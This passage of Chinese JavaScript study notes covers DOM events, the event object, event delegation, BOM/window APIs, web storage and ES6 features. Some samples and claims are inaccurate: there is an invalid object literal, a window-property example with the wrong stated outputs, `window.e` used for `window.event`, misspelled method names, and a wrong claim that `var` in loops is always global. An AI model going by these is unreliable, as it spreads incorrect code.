​		当我把上面addEventListener的第三个参数设置为true,那么就会处于捕获阶段

```
      <script>
           //给box绑定事件
           document.getElementById('box').addEventListener('click', function () {
           alert('我是box盒子触发的')
           },false)
           //给Body绑定事件
           document.body.addEventListener('click', function () {
           alert('我是body触发的')
           },false)
      </script>
```

​		点击box,依次触发下面结果：

![image-20201012232941969](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140825.png)

​		![image-20201012232917460](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140830.png)

​	

​		这次事件触发的顺序和冒泡的相反，父元素先触发，子元素再触发

​		`注意：点击box盒子外的区域不会触发捕获和冒泡，因为，你只点击了body，这个就很明确，只会触发body绑定的事件`

###### 事件对象（event)

什么是事件对象？

• 就是当你触发了一个事件以后，对该事件的一些描述信息

• 例如：

   ° 你触发一个点击事件的时候，你点在哪个位置了，坐标是多少

   ° 你触发一个键盘事件的时候，你按的是哪个按钮

• 系统给我们自动创建一个对应的对象来描述这些信息，我们就把这个对象叫做 事件对象

• ``事件对象系统会自动传给我们的事件函数，在每一个事件处理函数的参数位置，默认第一个就是事件对象``

```
      var box = document.querySelector('.box')
         console.log(box)
         box.onclick = function (event){
             //event.X轴坐标点信息 根据页面来显示的
             console.log(event.x)
        }
```

- 这个事件对象我们可以自己命名 比如event、evt、e......
- 事件对象也有兼容性问题 ie678通过 window.event获取  兼容性的写法 event=event || window.event;

```
      box.addEventListener('click',function(event){
      		//当在正常浏览器中，event存在，那么就直接返回event,在ie678中，event=undefined,那么就会返回window.event
                event=event||window.event;
              })
```

**事件对象的常见属性和方法**

![image-20201013070952026](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140835.png)

1.e.target与this

- e.target 返回的是触发事件的对象（元素）
- this返回的是绑定事件的对象（元素）
- e.target点击了哪个元素，就返回哪个元素；this哪个元素绑定了该事件就返回谁

```
    <div class="box"></div>
    <script>
      var box = document.querySelector('.box')
      box.addEventListener('click', function (e) {
        e = e || window.event
        console.log(event.target)
        console.log(this)
      })
    </script>
```

![image-20201013071729731](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140840.png)

2、返回事件类型（type）

```
     <div class="box"></div>
         <script>
           var box = document.querySelector('.box')
           box.addEventListener('click', function (e) {
             e = e || window.e
             console.log(e.type)
           })
         </script>
```

​	![image-20201013072253545](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140845.png)

3、阻止默认行为（事件），让链接不跳转或者提交按钮不提交

```
      <a href="http://www.baidu.com">百度一下</a>
         <script>
           var a = document.querySelector('a')
           a.addEventListener('click', function (e) {
             e = e || window.e
             e.preventDefault()
           })
         </script>
```

这样链接就不会跳转了

**鼠标事件对象**

![img](https://img2018.cnblogs.com/blog/1877004/202001/1877004-20200110211558558-1637153900.png)

```
       <script>
             // 鼠标事件对象 MouseEvent
             document.addEventListener('click', function(e) {
                 // 1. client 鼠标在可视区的x和y坐标
                 console.log(e.clientX);
                 console.log(e.clientY);
                 console.log('---------------------');
                 // 2. page 鼠标在页面文档的x和y坐标
                 console.log(e.pageX);
                 console.log(e.pageY);
                 console.log('---------------------');
                 // 3. screen 鼠标在电脑屏幕的x和y坐标
                 console.log(e.screenX);
                 console.log(e.screenY);
             })
         </script>
```



###### 阻止事件冒泡

事件方法默认只会触发冒泡，并不会触发捕获，所以并不需要阻止捕获，只需要阻止冒泡

事件冒泡：开始由最具体的元素接收，然后逐级向上传播到DOM最顶层节点。

阻止事件冒泡的的两种方式

**标准写法：利用事件对象里面的stopPropagation()方法**

> 在子元素的事件方法中加上e.stopPropagation();

非标准写法：IE6-8利用事件对象cancelBubble属性

> 在子元素的事件方法中加上e.cancelBubble=true;

阻止事件冒泡的兼容性解决方案

```
 	<a href="http://www.baidu.com">百度一下</a>
    <script>
      var a = document.querySelector('a')
      a.addEventListener('click', function (e) {
        if (e && e.stopPropagation) {
          e.stopPropagation()
        } else {
          window.event.cancelBubble = true
        }
      })
    </script>
```

###### 事件委托（代理，委派）

事件委托也称为事件代理，在jQuery里面称为事件委派

事件委托的原理：

​		`不是每个节点单独设置事件监听器，而是事件监听器设置在其父节点上，然后利用冒泡原理影响设置每个子节点`

​		案例：给ul注册事件，然后利用事件对象的target来找到当前点击的li,因为点击li,事件会冒泡到ul上，

​					ul由注册事件，就会触发事件监听器

​		**注意：e.target指的是触发事件的最上层元素

```
       <ul>
           <li>我是第一个li</li>
           <li>我是第二个li</li>
           <li>我是第三个li</li>
         </ul>
         <script>
           var ul = document.querySelector('ul')
           ul.addEventListener('click', function (e) {
             e = e || window.event
             //e.target指的是触发事件的最上层元素
             e.target.style.backgroundColor = 'pink'
           })
         </script>
```

![image-20201013085116175](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140858.png)

事件委托的作用

​		我们只操作绑定了一个事件，提高了程序的性能，而且如果后来动态添加的元素也不用重新绑定事件了

###### 常用的鼠标事件

![img](https://img2020.cnblogs.com/blog/2106211/202009/2106211-20200921233132391-803944683.png)

1、禁止鼠标右击菜单

​		contextmenu主要控制应该何时显示上下文菜单，主要用于程序员取消默认的上下文菜单

```
      document.addEventListener('contextmenu', function (e) {
             e.preventDefault()
           })
```

2、禁止选中文字

​	selectstart

```
      document.addEventListener('selectstart', function (e) {
             e.preventDefault()
           })
```

3、mousemove只要我们鼠标移动1px 就会触发这个事件

###### 常用的键盘事件

1.keyup 按键弹出的时候触发

　document.onkeyup = function(){

　　　console.log(' 我弹起了 ');

　}

2.keydown 按键按下的时候触发 能识别功能键 比如 Ctrl shift 左右箭头

　document.addEventListener('keydown',function(){

　　　console.log('我按下了down');

　})

3.keypress 按键按下的时候触发 不能识别功能键 比如 Ctrl shift  左右箭头

　document.addEventListener('keypress',function(){

　　　console.log('我按下了keypress');

　})

4.三个事件的执行顺序：keydown - - keypress - - keyup

5.键盘事件对象 keyCode 返回该键的 ASCII 值

6.keydown 和 keyup 不区分 字母大小写 keypress 区分字母大小写

　document.addEventListener('keydown',function(e){

　　　if( e.keyCode === 65 ){

　　　　　alert("按下了 a 键");

　　　}else{

　　　　　alert('没有按下 a 键 ');

　　　}

　})

`注意：keydown和keypress在文本框里面的特点：他们两个事件触发的时候，文字还没有落入文本框`

​		 `keyup事件触发的时候，文字已经落入文本框里面了`

##### DOM浏览器对象模型

###### BOM概述

1. 什么是BOM

   BOM(Browser Object Model)即浏览器对象模型，它提供了独立与内容而与浏览器窗口进行交互的对象，其核心对象是window.

   BOM由一系列相关的对象构成，并且每个对象都提供了很多方法和属性。

   BOM缺乏标准，javascript语法的标准化组织是ECMA,DOM的标准化组织是W3C，BOM最初是Netscape浏览器的一部分

   ![img](https://img-blog.csdn.net/20180310174632251?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2FveXVhbjEwNDQ3MDQ0NDY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70)

   <img src="https://img-blog.csdnimg.cn/20190128131908530.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjYyMjYx,size_16,color_FFFFFF,t_70" alt="BOM 对象示意图" style="zoom:80%;" />

   window对象是浏览器的顶级对象，它具有双重角色。

   1、它是JS访问浏览器窗口的一个接口

   2、它是一个全局对象。定义在全局作用域中的变量、函数都会变成window对象的属性和方法。

   ​	 在调用的时候省略window,前面学习的对话框都属于window对象方法，如alert()、prompt().

   ​	let str = prompt("请输入：")
   
   ​	console.log(str)   //输入的内容
   
   <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140910.png" alt="image-20201228184222822" style="zoom:67%;" />
   
   ![image-20201228184236747](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140914.png)
   
   `注意：window下的一个特殊属性window.name,这个属性为空，所以尽量不要定义name这个变量`
   
   

###### window对象的常见事件

1、窗口加载事件

```
     window.onload = function() { }
     或者
     window.addEventListener("load", function(){})	
```

​	window.onload是窗口（页面）加载事件，当文档内容完全加载完会触发该事件（包括图像、脚本文件、css文件等），就调用的处理函数。

​	**注意：**

​	1.有了window.onload就可以把js代码写在页面元素的上方，因为onload是等页面内容全部加载完毕，再去执行处理函数。

​	2.window.onload**传统注册事件方式**只能写一次，如果有多个，以最后一个window.onload为准。

​	3.如果使用addEventListener则没有限制。

​	**DOMContentLoaded事件**

```
	document.addEventListener('DOMContentLoaded', function(){})
```

​	DOMContentLoaded事件触发时，仅当DOM加载完毕，不包括样式表、图片、flash等等。IE9以上才支持。

​	如果页面的图片很多的话，从用户访问到onload触发可能需要较长的时间，交互效果就不能实现，必然会影响用户的体验，
​		  此时用DOMContentLoaded事件比较合适。

2、调整窗口大小事件

```
     window.onresize = function() { }
     window.addEventListener("resize", function(){});
```

​	window.onresize是调整窗口大小加载事件，当触发时就调用的处理函数。

​	**注意：**

​	1.只要窗口大小发生像素变化，就会触发这个事件。

​	2.`我们经常利用这个事件完成响应式布局`。window.innerWidth当前屏幕的宽度。

###### window对象常见的方法

1、open(),新建一个浏览器窗口

​	**语法：**

window.open([URL], [窗口名称], [参数字符串])

**参数说明:**

URL：可选参数，在窗口中要显示网页的网址或路径。如果省略这个参数，或者它的值是空字符串，那么窗口就不显示任何文档。

窗口名称：可选参数，被打开窗口的名称。

  1.该名称由字母、数字和下划线字符组成。
  	  2."_top"、"_blank"、"_self"具有特殊意义的名称。
  		  _blank：在新窗口显示目标网页
           _self：在当前窗口显示目标网页
           _top：框架网页中在上部窗口中显示目标网页
  	   3.相同 name 的窗口只能创建一个，要想创建多个窗口则 name 不能相同。
  	   4.name 不能包含有空格。

参数字符串：可选参数，设置窗口参数，各参数用逗号隔开。	

###### 定时器

**两种定时器**

window对象给我们提供了两个非常好用的方法-定时器

- setTimeout()
- setInterval()

**setTimeout()定时器**

```
	window.setTimeout(调用的函数，[延迟的毫秒数])；
```

setTimeout()方法用于设置一个定时器，该定时器在定时器到期后执行调用函数

语法规范：window.setTimeout(调用函数，延迟时间)；

1、这个window在调用的时候可以省略

2、这个延时时间单位是毫秒 但是可以省略，如果省略默认的是0

3、这个调用函数可以直接写函数，也可以引用函数，写函数名

4、页面中有很多的定时器，我们经常给定时器加标识符（名字）

例：

```
	var timer1=setTimeout(function(){
		console.log('时间到了')
	},2000)
	function callback(){
	console.log('爆炸了')
	}
	var timer2=setTimeout(callback,3000)//引用函数，直接写函数名
```

###### this

this的指向在函数定义的时候是确定不了的，只有函数执行的时候才能确定this到底指向谁，一般情况下this的最终指向的是那个调用它的对象

1、全局作用域或者普通函数中this指向全局对象window(注意定时器里面的this指向window)

```
	console.log(this)//window
	function fn(){
		console.log(this)
	}
	window.fn()//window
	setTimeout(function(){
		console.log(this)
	},1000)//window
```

2、方法调用者谁调用this指向谁

3、构造函数中this指向构造函数的实例

###### JS执行机制

JS是单线程

javascript语言的一大特点就是单线程，也就是说，同一个时间只能做一件事。这是因为javascript这门脚本语言诞生的使命所致——javascript是为处理页面中用户的交互，以及操作DOM而诞生的。比如我们对某个DOM元素进行添加和删除操作，不能同时进行。应该先进行添加，之后再删除。 

###### location对象

###### navigator对象history对象

###### 储存对象

Web 存储 API 提供了Cookie, sessionStorage （会话存储） 和 localStorage（本地存储）两个存储对象来对网页的数据进行添加、删除、修改、查询操作。

- Cookie        大小4kb

- localStorage 用于长久保存整个网站的数据，保存的数据没有过期时间，直到手动去除。   大小5MB
- sessionStorage 用于临时保存同一窗口(或标签页)的数据，在关闭窗口或标签页之后将会删除这些数据。  大小5MB

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210306140801.png" alt="image-20201111104922186" style="zoom:80%;" />

> sessionStorage使用实例：

```
     // 存储
     sessionStorage.setItem("lastname", "Smith");
     // 检索
     document.getElementById("result").innerHTML = sessionStorage.getItem("lastname");
```

> 语法

```
	window.sessionStorage
```

保存数据语法：

```
	sessionStorage.setItem("key", "value");
```

读取数据语法：

```
	var lastname = sessionStorage.getItem("key");
```

删除指定键的数据语法：

```
	sessionStorage.removeItem("key");
```

删除所有数据：

```
	sessionStorage.clear();
```

> localStorage使用实例：

```
     // 存储
     localStorage.setItem("lastname", "Smith");
     // 检索
     document.getElementById("result").innerHTML = localStorage.getItem("lastname");
```

> 语法

```
window.localStorage
```

保存数据语法：

```
localStorage.setItem("key", "value");
```

```
 sessionStorage.key = 'value'   //用这个也行
```

读取数据语法：

```
var lastname = localStorage.getItem("key");
```

```
var lastname = localStorage.key   //用这个也行
```

删除数据语法：

```
localStorage.removeItem("key");
```

`需要注意的是：sessionStorge和localStorge只能储存字符串，储存对象或者数组都需要先使用JSON.stringify()处理，取出使用JSON.parse()再转换为对象或者说组`

**localstorage可以实现多页面交互**

示例：

index1.html:

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Document</title>
     </head>
     <body>
       <input type="text" id="input">
       <script>
         document.getElementById('input').onblur = function () {
           localStorage.setItem('demo',this.value)
         }
       </script>
     </body>
     </html>
```

index2.html

```
     <!DOCTYPE html>
     <html lang="en">
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Document</title>
     </head>

     <body>
       <input type="text" id="val">
       <script>
         //只要localsrorage数据发生变化了，就会触发storage这个事件
        window.addEventListener('storage',function (e) {
          console.log(e);
          document.getElementById('val').value = e.newValue
        })
       </script>
     </body>
     </html>
```

###### console

1. cosnole.time()

   > console.time() 方法是作为计算器的起始方法。
   >
   > 该方法一般用于测试程序执行的时长。
   >
   > [console.timeEnd()](https://www.runoob.com/jsref/met-console-timeend.html) 方法为计算器的结束方法，并将执行时长显示在控制台。
   >
   > 如果一个页面有多个地方需要使用到计算器，可以添加标签参数来设置。

   ![image-20210801103621636](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210801103621.png)

   使用实例：

   ```
   console.time();
   for (i = 0; i < 100000; i++) {
     // 代码部分
   }
   console.timeEnd();
   ```

   

#### ES6

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210815005507.png" alt="ES6小尺寸"  />

##### 新的声明方式

**var与let、const的区别**

> - 不属于顶层对象window
> - 不允许重复声明
> - 不存在变量提升
> - 暂时性死区
> - 块级作用域

**1、使用var声明的变量，其作用域为全局或者该语句所在的函数内，且存在变量提升现象。**

　　下面使用node.js演示，也可以插入到html文件中使用以下代码

```
var a = 10;
function test() {
    console.log("function获取的全局变量a" + a);
}
test();
console.log("外部获取的全局变量" + a);
```

输出结果：

　　![img](https://img2020.cnblogs.com/blog/2029744/202005/2029744-20200517000029984-741262760.png)

 上述代码证明了var定义的全局变量可以在任何地方使用。

```
for(var  i=0;i<10;i++){
}
console.log(i);
```

输出结果：

　　![img](https://img2020.cnblogs.com/blog/2029744/202009/2029744-20200910171121109-628898075.png)

 在for,while,switch等语句的括号中定义变量，也属于全局变量

for(var a=1){}

相当于

for(var a=1){

　　var a=1;

}

在这些语句的括号中定义变量相当于隐性在代码块内定义了该该变量

```
function test() {
    console.log("function获取的b" + b);
    var b = 20;
}
test();
console.log("外部获取的全局变量" + a);
var a = 10;
```

输出结果：

　　![img](https://img2020.cnblogs.com/blog/2029744/202005/2029744-20200517000520415-2126887234.png)

上述代码证明了var定义的变量会进行变量提升，也就是提前声明变量再赋值

console.log(a);

var a=10;

相当于：

var a;

consloe.log(a);

a=10;

```
function test() {
    console.log("function获取的b" + b);
    var b = 20;
}
test();
console.log(b);
```

输出结果：

　　![img](https://img2020.cnblogs.com/blog/2029744/202005/2029744-20200517000847567-1009211237.png)

 报错，证明，在函数定义的var变量在函数外无效，只能在函数内访问，也就是函数作用域

但是要注意的一点是：

　　for,while,switch等等语句var关键字定义的任何变量都属于全局变量，在任何地方都有效，不属于函数作用域

**2、let 、const不属于顶层对象window**

```
var a = 1;
b = 2;
console.log(window.a);   //1
console.log(window.b);   //2
let c = 1;
const d = 1;
console.log(window.a);   //undefined
console.log(window.b);   //undefined
```

**3、使用let声明的变量，其作用域为该语句所在的代码块内，不存在变量提升。**

let a = 10



function test() {

  let b = 20;

  console.log("function获取的b" + b);

  console.log("let定义的全局函数“+a);

}

test();

console.log(b);

输出结果：

　　![img](https://img2020.cnblogs.com/blog/2029744/202009/2029744-20200910165954294-1278487661.png)

```
for(let i=0;i<10;i++){
}
console.log(i);
```

输出结果：

　　报错：Uncaught ReferenceError: i is not defined

除了在函数和代码块定义的let变量都属于全局变量，在任何地方都可以访问，但是，在函数和代码块（包括for语句，while,swith,if等等语句的代码块中，也就是{}包裹的代码中），定义的let变量只在代码块内有效，这个代码块其他任何地方都无法获取到，和以上var不一样，var只有函数作用域，记住函数作用域不等同于代码块作用域，代码块包括for,if,while等语句。

同时let定义的变量不支持变量提升。

```
console.log(a);

let a = 10
```

![img](https://img2020.cnblogs.com/blog/2029744/202005/2029744-20200517002047452-850993838.png)

 

 直接报错，而不是undefined

**4、使用let、const关键字声明的变量具有暂时性死区特性**

```
 let num=10;
    if(true){
        console.log(num);//报错
        let num=11;
    }
```

暂时性死区的意思是，只要块内有定义该变量，那么该块内就会和块内定义的变量绑定，不会再读取外面定义相同变量的值，

但是在块内语句执行后声明，就算，外面有该变量也不会读取，而是报错

**5、使用const声明的是常量，在后面出现的代码中不能再修改该常量的值，而且是块级作用域，作用范围和let一样**

　　![img](https://img2020.cnblogs.com/blog/2029744/202005/2029744-20200517002204887-478739156.png)

##### 解构赋值

> 解构赋值是对赋值运算符的扩展。
>
> 他是一种针对数组或者对象进行模式匹配，然后对其中的变量进行赋值。
>
> 在代码书写上简洁且易读，语义更加清晰明了；也方便了复杂对象中数据字段获取。
>
> 可分为以下几种类型：
>
> - 数组解构
> - 对象解构
> - 字符串解构

###### 数组解构

基本用法

```
     let [a, b, c] = [1, 2, 3];
     // a = 1
     // b = 2
     // c = 3
```

可嵌套

```
     let [a, [[b], c]] = [1, [[2], 3]];
     // a = 1
     // b = 2
     // c = 3
```

可忽略

```
     let [a, , b] = [1, 2, 3];
     // a = 1
     // b = 3
```

不完全解构（a=1属于解构默认值，如果没有匹配到对用的值就使用默认值）

```
	let [a = 1, b] = []; // a = 1, b = undefined
```

###### **对象解构**

基本用法

```
     let { foo, bar } = { foo: 'aaa', bar: 'bbb' }; // foo = 'aaa' // bar = 'bbb'  
     //起别名
     let { baz : foo } = { baz : 'ddd' }; // foo = 'ddd'
     //在对象解构中是根据key来匹配的，顺序不影响解构
     let {age, name} = {name: 'webpon', '20'}
     console.log(age, name) // 20, webpon
```

可嵌套可忽略

```
     let obj = {p: ['hello', {y: 'world'}] };
     let {p: [x, { y }] } = obj;
     // x = 'hello'
     // y = 'world'
     let obj = {p: ['hello', {y: 'world'}] };
     let {p: [x, {  }] } = obj;
     // x = 'hello'
```

不完全解构

```
     let obj = {p: [{y: 'world'}] };
     let {p: [{ y }, x ] } = obj;
     // x = undefined
     // y = 'world'
```

剩余运算符

```
     let {a, b, ...rest} = {a: 10, b: 20, c: 30, d: 40};
     // a = 10
     // b = 20
     // rest = {c: 30, d: 40}
```

解构默认值

```
     let {a = 10, b = 5} = {a: 3};
     // a = 3; b = 5;
     let {a: aa = 10, b: bb = 5} = {a: 3};
     // aa = 3; bb = 5;
```

###### 字符串解构

在数组的解构中，*解构的目标若为可遍历对象，皆可进行解构赋值*。可遍历对象即实现 Iterator 接口的数据。

```
     let [a, b, c, d, e] = 'hello';
     // a = 'h'
     // b = 'e'
     // c = 'l'
     // d = 'l'
     // e = 'o'
```

**解构默认值**

```
	let [a = 2] = [undefined]; // a = 2
```

当解构模式有匹配结果，且匹配结果是 undefined 时，会触发默认值作为返回结果。

```
     let [a = 3, b = a] = [];     // a = 3, b = 3
     let [a = 3, b = a] = [1];    // a = 1, b = 1
     let [a = 3, b = a] = [1, 2]; // a = 1, b = 2
```

- a 与 b 匹配结果为 undefined ，触发默认值：**a = 3; b = a =3**
- a 正常解构赋值，匹配结果：a = 1，b 匹配结果 undefined ，触发默认值：**b = a =1**
- a 与 b 正常解构赋值，匹配结果：**a = 1，b = 2**

只要是可遍历对象即可使用数组解构

```
     let [a,b] = new Set([1,2])
     console.log(a,b);   //1 2
```

##### 数组遍历（ES6)

> - find()：返回数组中满足提供的测试函数的第一个元素的值。否则返回 [`undefined`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/undefined)。
> - findIndex()：返回数组中满足提供的测试函数的第一个元素的**索引**。若没有找到对应元素则返回-1。
> - for of
> - values()：返回一个新的 **`Array Iterator`** 对象，该对象包含数组每个索引的值
> - keys()：返回一个包含数组中每个索引键的`**Array Iterator**`对象。
> - entries()：返回一个新的**Array Iterator**对象，该对象包含数组中每个索引的键/值对。

具体用法请访问：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array

##### 数组的扩展（ES6)

> - 类数组 / 伪数组
> - Array.from()：从一个类似数组或可迭代对象创建一个新的，浅拷贝的数组实例。
> - Array.of()：创建一个具有可变数量参数的新数组实例，而不考虑参数的数量或类型。
> - copyWithin()：浅复制数组的一部分到同一数组中的另一个位置，并返回它，不会改变原数组的长度。
> - fill()：用一个固定值填充一个数组中从起始索引到终止索引内的全部元素。不包括终止索引。
> - includes():  用来判断一个数组是否包含一个指定的值，根据情况，如果包含则返回 true，否则返回

##### 剩余参数

![image-20201022182220697](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215753.png)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215756.png" alt="image-20201022182452793" style="zoom:80%;" />

##### 拓展运算符（重要）

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215800.png" alt="image-20201022182748232" style="zoom:80%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215803.png" alt="image-20201022183003525" style="zoom:80%;" />

![image-20201022183141205](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215808.png)

array.push方法可以一次性插入多个以逗号分割的参数

![image-20201022183302460](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505215845.png)

拓展运算符也可以合并对象

基本用法：

```
     let age = {age: 15};
     let name = {name: "Amy"};
     let person = {...age, ...name};
     person;  //{age: 15, name: "Amy"}
```

**注意点**

`自定义的属性和拓展运算符对象里面属性的相同的时候：自定义的属性在拓展运算符后面，则拓展运算符对象内部同名的属性将被覆盖掉。`

```
     let person = {name: "Amy", age: 15};
     let someone = { ...person, name: "Mike", age: 17};
     someone;  //{name: "Mike", age: 17}
```

##### 模板字符串

1、模板字符串中可以`解析变量`。

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221453.png" alt="image-20201022162955617" style="zoom:80%;" />

在${}中可以使用变量，可以解析变量

2、模板字符串中可以`换行`

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505221457.png" alt="image-20201022163123225" style="zoom:80%;" />

3、在模板字符串中可以`调用函数`

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220011.png" alt="image-20201022163255951" style="zoom:80%;" />

调用函数的位置的值是函数的返回值

##### String的扩展方法

###### **实例方法：startWith()和endsWidth()**

- startsWidth():表示参数字符串是否在原字符串的头部，返回布尔值

- endsWidth():表示参数字符串是否在原字符串的尾部，返回布尔值

  ![image-20201022163956969](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220014.png)

![image-20201022164120613](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220019.png)

输出结果：

![image-20201022164140769](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220022.png)

**实例方法：repeat()**

repeat方法表示将原字符串重复n次，返回一个新字符串

![image-20201022164351724](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220027.png)

###### String.prototype.trim()

> **`trim()`** 方法会从一个字符串的两端删除空白字符。在这个上下文中的空白字符是所有的空白字符 (space, tab, no-break space 等) 以及所有行终止符字符（如 LF，CR等）。

[语法](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/Trim#语法)

```
str.trim()
```

[返回值](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/Trim#返回值)

一个代表调用字符串两端去掉空白的新字符串。

[描述](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/Trim#描述)

`trim()` 方法返回一个从两头去掉空白字符的字符串，并不影响原字符串本身。

[例子](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/Trim#例子)

[使用 `trim()`](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/Trim#使用_trim)

下面的例子中将显示小写的字符串 'foo':

```
var orig = '   foo  ';
console.log(orig.trim()); // 'foo'

// 另一个 .trim() 例子，只从一边删除

var orig = 'foo    ';
console.log(orig.trim()); // 'foo'
```

##### Symbol

> **symbol** 是一种基本数据类型 （[primitive data type](https://developer.mozilla.org/zh-CN/docs/Glossary/Primitive)）。`Symbol()`函数会返回**symbol**类型的值，该类型具有静态属性和静态方法。它的静态属性会暴露几个内建的成员对象；它的静态方法会暴露全局的symbol注册，且类似于内建对象类，但作为构造函数来说它并不完整，因为它不支持语法："`new Symbol()`"。
>
> 每个从`Symbol()`返回的symbol值都是唯一的。一个symbol值能作为对象属性的标识符；这是该数据类型仅有的目的。

使用场景一(唯一的键值):

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210815165837.png" alt="image-20210815165836179" style="zoom: 67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210815165851.png" alt="image-20210815165850056" style="zoom:80%;" />

使用场景二(隐藏实例属性):

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210815170208.png" alt="image-20210815170207232" style="zoom: 67%;" />

![image-20210815170319942](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210815170320.png)

使用场景三(常用):

```
const shapeType = {
	a: Symbol(),
	b: Symbol()
}
function get(shape) {
	let area = 0
	switch(shape) {
		case shapeType.a:
			area = 1
			break;
		case shapeType.b:
			area = 2
			break;	
		default: 
			area = 3
	}
	return area
}
get(shape.a)
```

详情请访问:https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Symbol

##### Set集合

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220031.png" alt="image-20201107225916736" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220034.png" alt="image-20201107230324495" style="zoom:67%;" />

Set本身是一个构造函数，用来生成Set数据结构，可以使用for...of进行遍历

![image-20201022164650960](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220039.png)

Set函数可以接受一个数组作为参数，用来初始化。

![image-20201022164718108](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220043.png)

![image-20201022164800109](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220051.png)

输出结果：

![image-20201022164822446](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220058.png)

**数组去重**

  <script>
      var a = [1, 2, 3, 2, 1, 232, 11, 1]
      var s1 = new Set(a)
      console.log(s1)
      a = [...s1]
      console.log(a)
    </script>

输出结果：

![image-20201022180626354](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220105.png)

...s1这个括号运算符可以把数组,set数据结构通过分隔符，分割，详情请浏览`ES6->Array的扩展方法`

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220110.png" alt="image-20201022181447419" style="zoom:80%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220118.png" alt="image-20201022181854465" style="zoom:80%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220123.png" alt="image-20201107231146591" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220128.png" alt="image-20201107231429686" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220130.png" alt="image-20201107231429686" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220133.png" alt="image-20201107231528895" style="zoom:67%;" />

##### Map字典 

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220136.png" alt="image-20201107231752402" style="zoom:67%;" />

**Map 和 Object 的区别**

- 一个 Object 的键只能是字符串或者 Symbol，但一个 Map 的键可以是任意值。

- Map 中的键值是有序的（FIFO 原则），而添加到对象中的键则不是。

- Map 的键值对个数可以从 size 属性获取，而 Object 的键值对个数只能手动计算。

- Object 都有自己的原型，原型链上的键名有可能和你自己在对象上的设置的键名产生冲突。

  当Map 中的 key

  **key 是字符串**

  ```
  var myMap = new Map();
  var keyString = "a string"; 
  myMap.set(keyString, "和键'a string'关联的值");
  myMap.get(keyString);    // "和键'a string'关联的值"
  myMap.get("a string");   // "和键'a string'关联的值"
                           // 因为 keyString === 'a string'
  ```

  **当key 是对象**

  ```
  var myMap = new Map();
  var keyObj = {}, 
  myMap.set(keyObj, "和键 keyObj 关联的值");
  myMap.get(keyObj); // "和键 keyObj 关联的值"
  myMap.get({}); // undefined, 因为 keyObj !== {}
  ```

  当**key 是函数**

  ```
  var myMap = new Map();
  var keyFunc = function () {}, // 函数
  myMap.set(keyFunc, "和键 keyFunc 关联的值");
  myMap.get(keyFunc); // "和键 keyFunc 关联的值"
  myMap.get(function() {}) // undefined, 因为 keyFunc !== function () {}
  ```

  当**key 是 NaN**

  ```
  var myMap = new Map();
  myMap.set(NaN, "not a number");
  myMap.get(NaN); // "not a number"
  var otherNaN = Number("foo");
  myMap.get(otherNaN); // "not a number"
  ```

  虽然 NaN 和任何值甚至和自己都不相等(NaN !== NaN 返回true)，NaN作为Map的键来说是没有区别的。

##### Proxy(代理)

